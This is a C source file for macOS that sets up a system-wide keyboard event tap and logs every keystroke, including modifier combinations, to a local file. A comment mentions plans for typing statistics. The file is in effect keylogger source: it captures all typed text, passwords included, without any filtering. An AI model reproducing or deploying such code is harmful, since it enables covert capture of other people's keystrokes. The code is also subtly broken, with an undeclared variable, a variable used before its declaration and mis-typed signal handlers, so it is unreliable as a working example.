#include "batman.h"
#define BATCH_SZ 200

CGEventFlags lastFlags = 0;

struct hashmap *hm = NULL;
struct hashmap *stats = NULL;

char buffer[BATCH_SZ];

int buffer_index = 0;
int hashmap_size = 0;
int stats_size = 0;

void flush() {
  if (buffer_index == 0) return;
  // write to file
  fwrite(buffer, 1, buffer_index, logfile);
  fflush(logfile);

  buffer_index = 0;
  memset(buffer, 0, BATCH_SZ);
}

int main(int argc, const char *argv[]) {
  signal(SIGINT, flush);
  signal(SIGTERM, flush);

  update_hashmap(&hm, &hashmap_size);

  CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
  CFMachPortRef eventTap = CGEventTapCreate(
    kCGSessionEventTap,
    kCGHeadInsertEventTap,
    0,
    eventMask,
    CGEventCallback,
    NULL
  );

  if (!eventTap) {
    fprintf(stderr, "ERROR: Unable to create event tap.\n");
    exit(1);
  };

  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
    kCFAllocatorDefault, eventTap, 0
  );
  CFRunLoopAddSource(
    CFRunLoopGetCurrent(),
    runLoopSource,
    kCFRunLoopCommonModes
  );
  CGEventTapEnable(eventTap, true);

  if (argc == 2) {
    if (strcmp(argv[1], "clear") == 0) {
      fopen(logfileLocation, "w");
      printf("%s cleared.\n", logfileLocation);
      fflush(stdout);
      exit(1);
    } else
      logfileLocation = argv[1];
  };

  logfile = fopen(logfileLocation, "a");
  if (!logfile) {
    logfile = fopen(logfileLocation, "w");
  };
  if (!logfile) {
    fprintf(stderr, "ERROR: Unable to open %s for writing, check permissions.\n", logfileLocation);
    exit(1);
  };

  fprintf(logfile, "Keylogging has begun.\n");
  fflush(logfile);

  printf("Logging to: %s\n", logfileLocation);
  fflush(stdout);
  CFRunLoopRun();

  return 0;
}

CGEventRef CGEventCallback(
  CGEventTapProxy proxy,
  CGEventType type,
  CGEventRef event,
  void *refcon
) {
  if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
    return event;
  };

  CGEventFlags flags = CGEventGetFlags(event);
  CGKeyCode keyCode =
      (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

  // Calculate key up/down.
  bool rcmd = false, lcmd = false;
  bool rshift = false, lshift = false;
  bool ropt = false, lopt = false;
  bool rctrl = false, lctrl = false;
  bool caps = false;

  if (type == kCGEventFlagsChanged) {
    switch (keyCode) {
      case 54:  // [rcmd]
        rcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
        break;
      case 55:  // [lcmd]
        lcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
        break;
      case 56:  // [lshift]
        lshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
        break;
      case 60:  // [rshift]
        rshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
        break;
      case 58:  // [loption]
        lopt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
        break;
      case 61:  // [roption]
        ropt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
        break;
      case 59:  // [lctrl]
        lctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
        break;
      case 62:  // [rctrl]
        rctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
        break;
      case 57:  // [caps]
        caps = (flags & kCGEventFlagMaskAlphaShift) && !(lastFlags & kCGEventFlagMaskAlphaShift);
        break;
      default:
        break;
    }
  } else if (type == kCGEventKeyDown) {
    down = true;
  }
  lastFlags = flags;

  if (!down) return event;

  char key_str[128];
  key_str[0] = '\0';
  if (rcmd) strcat(key_str, "rcmd+");
  if (lcmd) strcat(key_str, "lcmd+");
  if (rshift) strcat(key_str, "rshift+");
  if (lshift) strcat(key_str, "lshift+");
  if (ropt) strcat(key_str, "ropt+");
  if (lopt) strcat(key_str, "lopt+");
  if (rctrl) strcat(key_str, "rctrl+");
  if (lctrl) strcat(key_str, "lctrl+");
  if (caps) strcat(key_str, "caps+");

  strcat(key_str, key);
  printf("Key combination: %s\n", key_str);

  const char *key = convertKeyCode(keyCode, lshift || rshift, caps);
  for (int i = 0; i < strlen(key); i++) {
    buffer[buffer_index] = key[i];
    buffer_index++;
  };


  /*
    we need to also keep stats
    - speed of typing
    - number of times backspace was pressed
    - most used keys
    - most used key combinations
    - ignore (shift, ctrl, cmd, option)
  */


  if (buffer_index >= BATCH_SZ - 20) {
    flush();
    update_hashmap(&hm, &hashmap_size);
  };
  return event;
}

const char *convertKeyCode(int keyCode, bool shift, bool caps) {
  switch ((int) keyCode) {
    case 0:   return shift || caps ? "A" : "a";
    case 1:   return shift || caps ? "S" : "s";
    case 2:   return shift || caps ? "D" : "d";
    case 3:   return shift || caps ? "F" : "f";
    case 4:   return shift || caps ? "H" : "h";
    case 5:   return shift || caps ? "G" : "g";
    case 6:   return shift || caps ? "Z" : "z";
    case 7:   return shift || caps ? "X" : "x";
    case 8:   return shift || caps ? "C" : "c";
    case 9:   return shift || caps ? "V" : "v";
    case 11:  return shift || caps ? "B" : "b";
    case 12:  return shift || caps ? "Q" : "q";
    case 13:  return shift || caps ? "W" : "w";
    case 14:  return shift || caps ? "E" : "e";
    case 15:  return shift || caps ? "R" : "r";
    case 16:  return shift || caps ? "Y" : "y";
    case 17:  return shift || caps ? "T" : "t";
    case 18:  return shift ? "!" : "1";
    case 19:  return shift ? "@" : "2";
    case 20:  return shift ? "#" : "3";
    case 21:  return shift ? "$" : "4";
    case 22:  return shift ? "^" : "6";
    case 23:  return shift ? "%" : "5";
    case 24:  return shift ? "+" : "=";
    case 25:  return shift ? "(" : "9";
    case 26:  return shift ? "&" : "7";
    case 27:  return shift ? "_" : "-";
    case 28:  return shift ? "*" : "8";
    case 29:  return shift ? ")" : "0";
    case 30:  return shift ? "}" : "]";
    case 31:  return shift || caps ? "O" : "o";
    case 32:  return shift || caps ? "U" : "u";
    case 33:  return shift ? "{" : "[";
    case 34:  return shift || caps ? "I" : "i";
    case 35:  return shift || caps ? "P" : "p";
    case 37:  return shift || caps ? "L" : "l";
    case 38:  return shift || caps ? "J" : "j";
    case 39:  return shift ? "\"" : "'";
    case 40:  return shift || caps ? "K" : "k";
    case 41:  return shift ? ":" : ";";
    case 42:  return shift ? "|" : "\\";
    case 43:  return shift ? "<" : ",";
    case 44:  return shift ? "?" : "/";
    case 45:  return shift || caps ? "N" : "n";
    case 46:  return shift || caps ? "M" : "m";
    case 47:  return shift ? ">" : ".";
    case 50:  return shift ? "~" : "`";
    case 65:  return ".";
    case 67:  return "*";
    case 69:  return "+";
    case 71:  return "🔙";
    case 75:  return "/";
    case 76:  return "⏎";
    case 78:  return "-";
    case 81:  return "=";
    case 82:  return "0";
    case 83:  return "1";
    case 84:  return "2";
    case 85:  return "3";
    case 86:  return "4";
    case 87:  return "5";
    case 88:  return "6";
    case 89:  return "7";
    case 91:  return "8";
    case 92:  return "9";
    case 36:  return "\n";
    case 48:  return "\t";
    case 49:  return " ";
    case 51:  return "[del]";
    case 53:  return "[esc]";
    case 54:  return "[r⌘]";
    case 55:  return "[l⌘]";
    case 58:  return "[l⌥]";
    case 59:  return "[l⎈]";
    case 61:  return "[r⌥]";
    case 62:  return "[r⎈]";
    case 63:  return "[fn]";
    case 72:  return "[volup]";
    case 73:  return "[voldn]";
    case 74:  return "[mute]";
    case 123: return "→";
    case 124: return "←";
    case 125: return "↓";
    case 126: return "↑";
  }
  return "[?]";
}
